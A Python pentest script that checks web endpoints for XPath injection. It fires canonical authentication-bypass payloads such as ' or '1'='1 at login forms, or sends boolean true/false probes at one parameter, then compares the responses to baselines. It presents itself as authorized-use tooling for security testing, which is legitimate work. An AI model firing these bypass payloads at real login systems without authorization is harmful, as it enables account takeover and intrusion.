#!/usr/bin/env python3
"""
xpath_fuzz.py - control-baselined XPath-injection detector + auth-bypass tester (authorized only).

Two modes:
  * login  (when --pass-field is given): fire the canonical XPath auth-bypass payloads (single- and double-quote contexts)
            at a login endpoint and decide "bypassed" against a learned wrong-creds baseline (or --success/--fail markers,
            or a --valid-user/--valid-pass good baseline = most reliable).
  * detect (otherwise): send an always-TRUE tail (' or '1'='1) vs an always-FALSE control (' or '1'='2) plus an error probe
            on one param, and flag a steered difference.

Low false-positive: a lone error is NOT a bypass; only a steered change against a clean baseline counts. XPath 1.0 has no
comments, so payloads are quote-balanced.

SAFE: send only to endpoints you're authorized to test; on success it reports the signal (does not pivot). Own/test accounts.

Usage:
  python3 xpath_fuzz.py --url https://t/login --user-field username --pass-field password --valid-user me --valid-pass pw
  python3 xpath_fuzz.py --url https://t/login --user-field username --pass-field password --success "Welcome"
  python3 xpath_fuzz.py --url "https://t/search" --param q --method GET
"""
import argparse, json, re, sys, urllib.parse, urllib.request, urllib.error


def send(url, method, headers, body, timeout):
    req = urllib.request.Request(url, data=body, method=method, headers=dict(headers))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), (e.read() if hasattr(e, "read") else b"")
    except Exception as e:
        return None, {}, f"__ERR__ {type(e).__name__}: {e}".encode()


def encode(fields, fmt):
    if fmt == "json":
        return json.dumps(fields).encode(), {"Content-Type": "application/json"}
    return urllib.parse.urlencode(fields).encode(), {"Content-Type": "application/x-www-form-urlencoded"}


def has_session(headers):
    return bool(re.search(r"(sess|sid|token|auth|jwt)", headers.get("Set-Cookie", ""), re.I)) if headers else False


def sig(resp):
    st, hd, bd = resp
    return (st, len(bd or b""), has_session(hd))


def bypass_payloads(uf, pf):
    return [
        ("' or '1'='1  (both)",     {uf: "' or '1'='1",     pf: "' or '1'='1"}),
        ("user=' or '1'='1",         {uf: "' or '1'='1",     pf: "x"}),
        ("admin' or '1'='1",         {uf: "admin' or '1'='1", pf: "x"}),
        ("' or ''='",                {uf: "' or ''='",       pf: "' or ''='"}),
        ("'or'1'='1  (no space)",    {uf: "'or'1'='1",       pf: "x"}),
        ('" or "1"="1  (dquote)',    {uf: '" or "1"="1',     pf: "x"}),
        ("' or 1=1 or ''='",         {uf: "' or 1=1 or ''='", pf: "x"}),
        ("union ]|//user|a[",        {uf: "']|//user|a['",   pf: "x"}),
    ]


def looks_success(resp, bad, good, success_re, fail_re):
    st, hd, bd = resp
    text = (bd or b"").decode("utf-8", "replace")
    if st is None or text.startswith("__ERR__"):
        return False, "request error"
    if success_re:
        return (re.search(success_re, text) is not None), f"success-marker /{success_re}/"
    if fail_re:
        return (re.search(fail_re, text) is None and st < 400), f"no fail-marker /{fail_re}/ + status<400"
    if good:
        gst, glen, gck = good
        return (st == gst and sig(resp)[2] == gck and st < 400), "matches good-login baseline"
    bst, blen, bck = bad
    reasons = []
    if st != bst and st is not None and st < 400:
        reasons.append(f"status {bst}->{st}")
    if sig(resp)[2] and not bck:
        reasons.append("new session cookie")
    if abs(sig(resp)[1] - blen) > max(40, int(blen * 0.5)):
        reasons.append(f"len {blen}->{sig(resp)[1]}")
    return (len(reasons) > 0), "; ".join(reasons) or "no change vs bad baseline"


def mode_login(a):
    hdr = dict(h.split(":", 1) for h in a.header) if a.header else {}

    def post(fields):
        body, ct = encode(fields, a.data_format)
        return send(a.url, a.method, {**ct, **hdr}, body, a.timeout)

    bad = sig(post({a.user_field: "nouser_x8b1t", a.pass_field: "wrongpw_x8b1t"}))
    good = None
    if a.valid_user and a.valid_pass:
        good = sig(post({a.user_field: a.valid_user, a.pass_field: a.valid_pass}))
        print(f"[i] good-login baseline: status={good[0]} len={good[1]} cookie={good[2]}")
    print(f"[i] bad-login  baseline: status={bad[0]} len={bad[1]} cookie={bad[2]}\n")

    hits = 0
    for label, fields in bypass_payloads(a.user_field, a.pass_field):
        resp = post(fields)
        ok, why = looks_success(resp, bad, good, a.success, a.fail)
        strong = bool(a.success or a.fail or good)
        if ok:
            hits += 1
            print(f"  [{'BYPASS' if strong else 'LIKELY-BYPASS'}] {label}")
            print(f"      status={resp[0]} len={len(resp[2] or b'')} cookie={sig(resp)[2]}  reason: {why}")
        elif a.verbose:
            print(f"  [no]     {label}  ({why})")
    print(f"\n[i] {hits} bypass signal(s). "
          + ("Confirm by logging in fresh with the payload and checking WHICH user you become."
             if hits else "No bypass detected with current baseline/markers."))
    return 0


def mode_detect(a):
    hdr = dict(h.split(":", 1) for h in a.header) if a.header else {}
    p = a.param

    def fire(val):
        if a.method.upper() == "GET":
            u = a.url + ("&" if "?" in a.url else "?") + urllib.parse.urlencode({p: val})
            return send(u, "GET", hdr, None, a.timeout)
        body, ct = encode({p: val}, a.data_format)
        return send(a.url, a.method, {**ct, **hdr}, body, a.timeout)

    base = sig(fire("x8base"))
    t = sig(fire("x8' or '1'='1"))
    f = sig(fire("x8' or '1'='2"))
    err = sig(fire("x8'"))
    print(f"[i] baseline : status={base[0]} len={base[1]}")
    print(f"  TRUE  (' or '1'='1): status={t[0]} len={t[1]}")
    print(f"  FALSE (' or '1'='2): status={f[0]} len={f[1]}")
    print(f"  ERROR (')          : status={err[0]} len={err[1]}")
    steered = (t[0], t[1]) != (f[0], f[1])
    errored = err[0] != base[0] or abs(err[1] - base[1]) > 40
    print("\n[verdict] " + (
        "XPATH INJECTION LIKELY - TRUE vs FALSE differ; verify the steer maps to data." if steered else
        ("error-context signal (single quote changes response) - probe boolean payloads by hand." if errored else
         "no TRUE/FALSE difference - probably not injectable here.")))
    return 0


def main():
    ap = argparse.ArgumentParser(description="XPath-injection detector + auth-bypass tester (authorized only).")
    ap.add_argument("--url", required=True)
    ap.add_argument("--method", default="POST")
    ap.add_argument("--data-format", choices=["form", "json"], default="form")
    ap.add_argument("--header", action="append", default=[], help="extra header 'Name: value' (repeatable)")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--verbose", action="store_true")
    ap.add_argument("--user-field", default="username")
    ap.add_argument("--pass-field", help="password field -> LOGIN mode")
    ap.add_argument("--valid-user")
    ap.add_argument("--valid-pass")
    ap.add_argument("--success", help="regex marking a successful login")
    ap.add_argument("--fail", help="regex marking a failed login")
    ap.add_argument("--param", help="single param to boolean-diff -> DETECT mode")
    a = ap.parse_args()
    if a.pass_field:
        return mode_login(a)
    if a.param:
        return mode_detect(a)
    sys.exit("[!] give --pass-field (login mode) or --param (detect mode)")


if __name__ == "__main__":
    sys.exit(main())
